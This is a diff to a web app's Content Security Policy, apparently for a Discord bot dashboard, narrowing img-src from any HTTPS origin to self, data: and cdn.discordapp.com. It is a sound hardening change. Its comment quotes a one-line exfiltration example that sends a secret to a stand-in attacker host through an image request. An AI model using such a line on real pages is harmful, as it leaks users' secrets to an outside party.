@@ -277,7 +277,23 @@ function createApp({ client = null, bot: injectedBot, sessionStore, configurePas
             "script-src-attr 'none'",
             // Still ratcheted rather than fixed outright; see the note above.
             "style-src 'self' 'unsafe-inline'",
-            "img-src 'self' data: https: cdn.discordapp.com",
+            // The bare `https:` this used to carry made the explicit CDN entry
+            // beside it decoration: any HTTPS origin was allowed, which is an
+            // exfiltration channel — `new Image().src = 'https://attacker/?' +
+            // secret` — for any injection that reaches the page (#919). It is
+            // the piece that gets the data *out*, so it goes even though on its
+            // own it exploits nothing.
+            //
+            // What is left is what the pages actually load. `'self'` covers the
+            // uploaded shop and activity images, which are served from
+            // /api/v1/item-image/ rather than from wherever an admin found them;
+            // `data:` covers the FileReader preview shown before an upload is
+            // saved. Every remaining image is a Discord avatar or guild icon,
+            // and those are built by discord.js's `displayAvatarURL()` or
+            // interpolated into a cdn.discordapp.com path in the views.
+            // media.discordapp.net is deliberately not listed: nothing in the
+            // dashboard requests it, and it can be added when something does.
+            "img-src 'self' data: https://cdn.discordapp.com",
             "connect-src 'self'",
             "font-src 'self'",
             "object-src 'none'",
